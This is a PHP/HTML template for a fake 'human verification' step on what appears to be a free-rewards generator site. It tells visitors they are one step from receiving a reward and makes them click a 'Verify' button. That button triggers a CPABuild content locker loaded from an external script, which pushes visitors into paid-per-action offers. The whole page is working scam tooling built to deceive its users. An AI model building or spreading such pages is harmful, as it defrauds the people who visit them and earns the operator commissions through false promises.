<!-- verification -->
<?php include('../config/config.php'); ?>
<div id="hd-vbs" class="hd-step" style="display: block;">
	<div class="vbs-s-wrapper">
		<div class="vbs-s-wrapper">
			<div class="vbs-s-window vbs-s-window-1">
				<div class="vbs-s-title animated bounceInDown animation-delay-200">
					<h3>Validation Required</h3>
				</div>
				<div class="vbs-f-wrapper animated bounceInUp animation-delay-200">
					<div class="vbs-f-content">
						<div id="human-verification-wrapper" class="human-verification-wrapper animated bounceIn">
							<h3>Last Step</h3>
							<div class="verification-inner">
								<p>You're one step away from receiving your <?php echo $rewards; ?>!</p>
								<div class="v-r-image">
									<img src="imgs/points.png" class="img-fluid v-r-img animated pulse infinite">
									<div class="v-r-i-amount"></div>
									<div class="v-r-i-label"><?php echo $rewards; ?></div>
								</div>
								<p>
									<span id="v-username"></span> .. You are almost done! 
									<br>
										<i class="fas fa-spinner fa-spin colver"></i>
									<br>
									Click on the button below to complete human verification
								</p>
								<div class="v-button-wrapper">
									<a id="verification-button" class="ib isb vbi sn-button animated pulse infinite" onclick="CPABuildLock()" >
										<span>Verify<i class="fas fa-user-check"></i></span>
									</a>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
<script type="text/javascript">
    var CPABUILDSETTINGS={"it":"<?php echo $cpa_it; ?>","key":"<?php echo $cpa_key; ?>"};
</script>
<script src="https://d13nu0oomnx5ti.cloudfront.net/3a15850.js"></script>